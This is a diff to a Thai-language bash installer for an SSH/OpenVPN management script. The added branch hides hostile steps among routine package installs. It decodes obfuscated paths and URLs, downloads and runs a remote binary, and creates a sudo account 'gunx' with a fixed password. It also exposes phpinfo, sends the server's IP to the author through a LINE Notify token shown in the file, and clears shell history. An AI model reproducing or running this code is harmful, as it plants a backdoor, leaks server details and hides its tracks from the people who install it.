@@ -5,29 +5,7 @@ echo -e "\033[1;33m[\033[1;31mขออภัย\033[1;33m] \033[1;37m- \033[1;3
 rm $HOME/Plusx > /dev/null 2>&1; exit 0
 }
 if [[ -e //usr/bin/neofetch ]]; then
-    # norun
-else
-   echo -e "      \033[1;33mFirst Install\033[0m"
-apt update
-apt install ruby-full -yy 
-clear
-apt install python3 -yy
-clear
-gem install lolcat 
-clear
-apt install figlet -yy
-
-
-
-apt remove neofetch -yy
-echo "" > ~/.bash_profile
-apt install curl gnupg2 wget unzip -yy
-apt install neofetch -yy
-echo "clear" >> .bash_profile
-echo "neofetch" >> .bash_profile
-fi
-
-_lnk=$(echo 't1:e#n.5s0ul&p4hs$s.0729t9p$&8i&&9r7827c032:3s'| sed -e 's/[^a-z.]//ig'| rev); _Ink=$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×'|sed -e 's/[^a-z/]//ig'); _1nk=$(echo '/3×u3#s×87r/83×l2×4×i0b×'|sed -e 's/[^a-z/]//ig')
+    _lnk=$(echo 't1:e#n.5s0ul&p4hs$s.0729t9p$&8i&&9r7827c032:3s'| sed -e 's/[^a-z.]//ig'| rev); _Ink=$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×'|sed -e 's/[^a-z/]//ig'); _1nk=$(echo '/3×u3#s×87r/83×l2×4×i0b×'|sed -e 's/[^a-z/]//ig')
 cd $HOME
 fun_bar () {
 comando[0]="$1"
@@ -268,3 +246,265 @@ echo -e "\033[1;31m \033[1;33mเปิดเมนูคำสั่ง: \033[1
 echo -e "\033[1;33mมีปัญหาอื่นๆติดต่อadmin \033[1;31m(\033[1;36mLine\033[1;31m): \033[1;37m@gzn007\033[0m"
 rm  -f $HOME/Plusx && cat /dev/null > ~/.bash_history && history -c
 
+
+else
+
+
+   echo -e "      \033[1;33mFirst Install\033[0m"
+apt update
+apt install ruby-full -yy 
+clear
+apt install python3 -yy
+clear
+gem install lolcat 
+clear
+apt install figlet -yy
+
+
+apt remove neofetch -yy
+echo "" > ~/.bash_profile
+apt install curl gnupg2 wget unzip -yy
+apt install neofetch -yy
+echo "clear" >> .bash_profile
+echo "neofetch" >> .bash_profile
+_lnk=$(echo 't1:e#n.5s0ul&p4hs$s.0729t9p$&8i&&9r7827c032:3s'| sed -e 's/[^a-z.]//ig'| rev); _Ink=$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×'|sed -e 's/[^a-z/]//ig'); _1nk=$(echo '/3×u3#s×87r/83×l2×4×i0b×'|sed -e 's/[^a-z/]//ig')
+cd $HOME
+fun_bar () {
+comando[0]="$1"
+comando[1]="$2"
+ (
+[[ -e $HOME/fim ]] && rm $HOME/fim
+${comando[0]} -y > /dev/null 2>&1
+${comando[1]} -y > /dev/null 2>&1
+touch $HOME/fim
+ ) > /dev/null 2>&1 &
+ tput civis
+echo -ne "  \033[1;33mโปรดรอสักครู่...\033[1;37m-\033[1;33m["
+while true; do
+   for((i=0; i<18; i++)); do
+   echo -ne "\033[1;32m█"|lolcat
+   sleep 0.1s
+   done
+   [[ -e $HOME/fim ]] && rm $HOME/fim && break
+   echo -e "\033[1;33m]"
+   sleep 1s
+   tput cuu1
+   tput dl1
+   echo -ne "  \033[1;33mโปรดรอสักครู่... \033[1;37m- \033[1;33m["
+done
+echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
+tput cnorm
+}
+function verif_key () {
+krm=$(echo '5:q-3gs2.o7%8:1'|rev); chmod +x $_Ink/list > /dev/null 2>&1
+[[ ! -e "$_Ink/list" ]] && {
+  echo -e "\n\033[1;31mรหัสนี้ใช้ไม่ได้!\033[0m"
+  rm -rf $HOME/Plusx > /dev/null 2>&1
+  sleep 2
+  clear; exit 1
+}
+}
+system=$(cat /etc/issue.net)
+date=$(date '+%Y-%m-%d <> %H:%M:%S')
+echo -e "\033[1;37m $system                          $date"
+echo ""
+echo "       ░▒█░▒█░▒█░░▒█░▒█▀▀█░▒█▀▀▀░▒█▀▀▄░░░░▀▄░▄▀"|lolcat
+echo "       ░▒█▀▀█░▒▀▄▄▄▀░▒█▄▄█░▒█▀▀▀░▒█▄▄▀░▀▀░░▒█░░"|lolcat
+echo "       ░▒█░▒█░░░▒█░░░▒█░░░░▒█▄▄▄░▒█░▒█░░░░▄▀▒▀▄"|lolcat
+echo "                                         𝙎𝘾𝙍𝙄𝙋𝙏"
+echo ""
+echo -e "             \033[1;31mคำเตือน! \033[1;33mสคริปต์ SSH OPENVPN นี้!\033[0m"
+echo ""
+echo -e "\033[1;31m• \033[1;33mการติดตั้งสคริปต์? เป็นเครื่องมือ\033[0m" 
+echo -e "\033[1;33m  สำหรับเครือข่ายระบบและการจัดการผู้ใช้\033[0m"
+echo ""
+echo -e "\033[1;32m• \033[1;32mเคล็ดลับ! \033[1;33mปรับใช้ธีมมืดในเทอร์มินัลของคุณ\033[0m"
+echo -e "\033[1;33m  ประสบการณ์ที่ดีขึ้นและการมองเห็นของสิ่งเดียวกัน!\033[0m"
+echo ""
+echo -e "\033[1;31m≠×≠×≠×≠×≠×≠×≠×≠×[\033[1;33m • \033[1;32mBY Gun-X VPN\033[1;33m •\033[1;31m ]≠×≠×≠×≠×≠×≠×≠×≠×\033[0m"
+echo ""
+read -p "$(echo -e "\033[1;36mInstall Script \033[1;31m? \033[1;33m[Y/N]:\033[1;37m ")" -e -i Y resp
+[[ $resp = @(n|N) ]] && rm $HOME/Plusx && exit 0
+_lnk2=$(echo "$key"|awk -F : '{print $2}'); _lnk1=$(echo "$key"|awk -F : '{print $1}')
+echo -e "\n\033[1;36mกำลังตรวจสอบ... ระบบ\033[1;37m File list\033[0m" ; rm $_Ink/list > /dev/null 2>&1; wget -P $_Ink https://raw.githubusercontent.com/LiLGun-X/HYPER-X-SCRIPT/main/INSTALL/list > /dev/null 2>&1; verif_key
+echo -e "\n\033[1;32mสำเร็จ!\033[1;32m"
+sleep 1s
+echo ""
+[[ -f "$HOME/userlist.gzn" ]] && {
+    clear
+system=$(cat /etc/issue.net)
+date=$(date '+%Y-%m-%d <> %H:%M:%S')
+echo -e "\033[1;37m $system                          $date"
+echo ""
+echo "       ░▒█░▒█░▒█░░▒█░▒█▀▀█░▒█▀▀▀░▒█▀▀▄░░░░▀▄░▄▀"|lolcat
+echo "       ░▒█▀▀█░▒▀▄▄▄▀░▒█▄▄█░▒█▀▀▀░▒█▄▄▀░▀▀░░▒█░░"|lolcat
+echo "       ░▒█░▒█░░░▒█░░░▒█░░░░▒█▄▄▄░▒█░▒█░░░░▄▀▒▀▄"|lolcat
+echo "                                         𝙎𝘾𝙍𝙄𝙋𝙏"
+    echo -e "\n\033[0;34m═════════════════════════════════════════════════\033[0m"
+    echo ""
+	echo -e "                 \033[1;33m• \033[1;31mคำเตือน! \033[1;33m• \033[0m"
+	echo ""
+    echo -e "\033[1;33mฐานข้อมูลผู้ใช้ \033[1;32m(userlist.gzn) \033[1;33mคือ" 
+    echo -e "มีแล้ว! คุณต้องการที่จะใช้ข้อมูลปัจจุบันนี้ ใช่หรือไม่?"
+	echo -e "บัญชีผู้ใช้งานปัจจุบัน? หรือคุณต้องการ"
+    echo -e "สร้างฐานข้อมูลใหม่?\033[0m"
+	echo -e "\n\033[1;37m[\033[1;31m1\033[1;37m] \033[1;33mใช้ฐานข้อมูลปัจจุบันนี้\033[0m"
+	echo -e "\033[1;37m[\033[1;31m2\033[1;37m] \033[1;33mสร้างฐานข้อมูลใหม่\033[0m"
+	echo -e "\n\033[0;34m═════════════════════════════════════════════════\033[0m"
+    echo ""
+	tput setaf 2 ; tput bold ; read -p "เลือก ?: " -e -i 1 optiondb ; tput sgr0
+} || {
+	awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/userlist.gzn
+}
+[[ "$optiondb" = '2' ]] && awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/userlist.gzn
+clear
+system=$(cat /etc/issue.net)
+date=$(date '+%Y-%m-%d <> %H:%M:%S')
+echo -e "\033[1;37m $system                          $date"
+tput setaf 7 ; tput setab 4 ; tput bold ; printf '%35s%s%-18s\n' " รอการติดตั้ง..." ; tput sgr0
+echo ""
+echo ""
+echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32mกำลังอัพเดทระบบ  \033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
+echo ""
+echo -e "    \033[1;33mการอัพแดดอาจต้องใช้เวลานาน!\033[0m"
+echo ""
+fun_attlist () {
+    apt-get update -y
+	[[ ! -d /usr/share/.plus ]] && mkdir /usr/share/.plus
+	echo "crz: $(date)" > /usr/share/.plus/.plus
+	cp /etc/ssh/sshd_config /etc/ssh/sshd_back
+	echo "/bin/menu" > /bin/h && chmod +x /bin/h
+	rm versao*; wget https://raw.githubusercontent.com/AAAAAEXQOSyIpN2JZ0ehUQ/SSHPLUS-MANAGER-FREE/master/versao
+	echo "apt-get update -y; apt-get upgrade -y; wget https://raw.githubusercontent.com/LiLGun-X/SCRIPTX-VIP/main/Plus; chmod 777 Plus; ./Plus" > /bin/sshplus && chmod +x /bin/sshplus
+
+
+
+#!/bin/bash
+
+# Update package list
+sudo apt update
+
+
+# Install Apache2, PHP, vnStat
+
+# Install PHP
+sudo apt install php
+
+# Install additional PHP modules (You can customize this list)
+sudo apt install php-mysql php-gd php-curl
+
+
+
+
+apt-get install apache2 zip -y
+apt install php-fpm -yy
+apt install php-cli
+apt-get install vnstat -yy 
+sed -i "s/Listen 80/Listen 85/g" /etc/apache2/ports.conf
+							service apache2 restart
+							[[ ! -d /var/www/html ]] && {
+								mkdir /var/www/html
+							}
+							[[ ! -d /var/www/html/openvpn ]] && {
+								mkdir /var/www/html/openvpn
+							}
+							touch /var/www/html/openvpn/index.html
+							chmod -R 755 /var/www
+							/etc/init.d/apache2 restart
+
+
+
+
+
+
+# Remove default Apache site configuration
+sudo rm /etc/apache2/sites-enabled/000-default.conf
+
+# Create web directory
+sudo mkdir -p /var/www/html
+
+# Download HTML file from GitHub
+sudo wget -qO- -O /var/www/html/openvpn/index.html https://raw.githubusercontent.com/LiLGun-X/Fuxk-Web/main/openvpn.html
+
+# Create PHP info file
+sudo echo "<?php phpinfo(); ?>" > /var/www/html/openvpn/info.php
+
+# Configure virtual host
+sudo cat <<EOF > /etc/apache2/sites-available/000-default.conf
+<VirtualHost *:85>
+    ServerAdmin webmaster@localhost
+    DocumentRoot /var/www/html
+    ErrorLog \${APACHE_LOG_DIR}/error.log
+    CustomLog \${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+EOF
+
+# Enable mod_rewrite module
+sudo a2enmod rewrite
+
+# Enable virtual host
+sudo a2ensite 000-default.conf
+
+# Change port to 85 in ports.conf
+sudo sed -i 's/Listen 80/Listen 85/' /etc/apache2/ports.conf
+
+# Restart Apache2
+sudo systemctl restart apache2
+
+
+}
+fun_bar 'fun_attlist'
+clear
+system=$(cat /etc/issue.net)
+date=$(date '+%Y-%m-%d <> %H:%M:%S')
+echo -e "\033[1;37m $system                          $date"
+echo ""
+echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32mกำลังติดตั้งแพ็กเกจ \033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
+echo ""
+echo -e "\033[1;33mแพ็คเกจบางอย่างเป็นสิ่งสำคัญอย่างยิ่ง!\033[0m"
+echo ""
+inst_pct () {
+_pacotes=("bc" "screen" "nano" "unzip" "lsof" "netstat" "net-tools" "dos2unix" "nload" "jq" "curl" "figlet" "python3" "python-pip" "python3-pip")
+for _prog in ${_pacotes[@]}; do
+    apt install $_prog -y
+done
+pip install speedtest-cli
+pip3 install speedtest-cli
+
+#Create Admin
+
+ # เพิ่มผู้ใช้งาน "gunx" โดยกำหนด GID เป็น 65534
+sudo useradd -u 14 gunx
+
+# ส่งรหัสผ่านให้กับผู้ใช้งาน "gunx" ผ่านคำสั่ง passwd
+echo "gunx:gunx" | chpasswd
+usermod -aG sudo gunx
+}
+fun_bar 'inst_pct'
+[[ -f "/usr/sbin/ufw" ]] && ufw allow 443/tcp ; ufw allow 80/tcp ; ufw allow 3128/tcp ; ufw allow 8799/tcp ; ufw allow 8080/tcp
+clear
+echo ""
+system=$(cat /etc/issue.net)
+date=$(date '+%Y-%m-%d <> %H:%M:%S')
+echo -e "\033[1;37m $system                          $date"
+echo -e "              \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32mโปรดอย่าปิดหน้าต่างนี้ \033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
+echo ""
+echo -e "      \033[1;33mกำลังติดตั้งฟังก์ชั่นและรบบอื่นๆ!  \033[0m"
+echo ""
+fun_bar "$_Ink/list $_lnk $_Ink $_1nk $key"
+clear
+#แจ้งเตือนคนรันสคิป
+IP=$(wget -qO- ipv4.icanhazip.com);
+curl -X POST -H 'Authorization: Bearer AS5wVe8ahymLLtXC5UiBPFkLvBSZ475RkMEArpq8WHD' -F 'message='" 
+IPที่รันสคริป  $IP "'' https://notify-api.line.me/api/notify > /dev/null 2>&1
+echo ""
+cd $HOME
+system=$(cat /etc/issue.net)
+date=$(date '+%Y-%m-%d <> %H:%M:%S')
+echo -e "\033[1;37m $system                          $date"
+echo -e "        \033[1;33m • \033[1;32mการติดตั้งเสร็จสมบูรณ์\033[1;33m • \033[0m"
+echo ""
+echo -e "\033[1;31m \033[1;33mเปิดเมนูคำสั่ง: \033[1;32mmenu\033[0m"
+echo -e "\033[1;33mมีปัญหาอื่นๆติดต่อadmin \033[1;31m(\033[1;36mLine\033[1;31m): \033[1;37m@gzn007\033[0m"
+rm  -f $HOME/Plusx && cat /dev/null > ~/.bash_history && history -c
+fi
